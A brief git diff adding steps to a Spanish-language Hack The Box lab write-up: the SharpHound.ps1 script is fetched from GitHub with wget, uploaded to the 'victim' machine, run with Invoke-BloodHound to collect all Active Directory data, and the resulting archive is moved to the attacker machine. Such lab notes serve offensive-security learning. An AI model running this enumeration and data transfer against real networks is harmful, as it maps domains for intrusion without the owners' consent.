@@ -176,4 +176,11 @@ Usaremos la utilidad del siguiente GitHub `https://github.com/puckiestyle/powers
 Nos lo traemos a nuestra maquina host
 `wget https://raw.githubusercontent.com/puckiestyle/powershell/refs/heads/master/SharpHound.ps1`
 
-Creamos una carpeta en la maquina victima en `Windows/Temp/Privesc`
+Creamos una carpeta en la maquina victima en `Windows/Temp/Privesc` y nos traemos el archivo
+`upload /home/jalag/Workzone/VPN/HTB/Machines/WorkLab/content/SharpHound.ps1`
+
+Ahora lo ejecutamos
+`Import-Module .\SharpHound.ps1`
+`Invoke-BloodHound -CollectionMethod All`
+
+Nos genera un comprimido que nos lo pasamos a nuestra maquina atacante
